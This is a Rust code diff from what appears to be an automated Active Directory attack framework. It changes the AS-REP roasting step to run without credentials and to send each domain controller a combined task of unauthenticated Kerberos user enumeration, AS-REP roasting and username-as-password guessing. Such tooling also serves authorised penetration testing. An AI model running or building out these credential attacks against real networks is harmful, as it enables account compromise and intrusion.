@@ -30,27 +30,29 @@ pub async fn auto_credential_access(
             break;
         }
 
-        // --- AS-REP Roast: one per domain ---
-        let asrep_work: Vec<(String, String, ares_core::models::Credential)> = {
+        // --- AS-REP Roast: one per domain (unauthenticated — no credentials required) ---
+        let asrep_work: Vec<(String, String)> = {
             let state = dispatcher.state.read().await;
-            let cred = match state.credentials.first() {
-                Some(c) => c.clone(),
-                None => continue,
-            };
             state
                 .domains
                 .iter()
                 .filter(|d| !state.is_processed(DEDUP_ASREP_DOMAINS, d))
                 .filter_map(|domain| {
                     let dc_ip = state.domain_controllers.get(domain).cloned()?;
-                    Some((domain.clone(), dc_ip, cred.clone()))
+                    Some((domain.clone(), dc_ip))
                 })
                 .collect()
         };
 
-        for (domain, dc_ip, cred) in asrep_work {
+        for (domain, dc_ip) in asrep_work {
+            let payload = json!({
+                "techniques": ["kerberos_user_enum_noauth", "asrep_roast", "username_as_password"],
+                "dc_ip": dc_ip,
+                "domain": domain,
+            });
+
             match dispatcher
-                .request_credential_access("asreproast", &dc_ip, &domain, &cred, 5)
+                .throttled_submit("credential_access", "credential_access", payload, 5)
                 .await
             {
                 Ok(Some(task_id)) => {
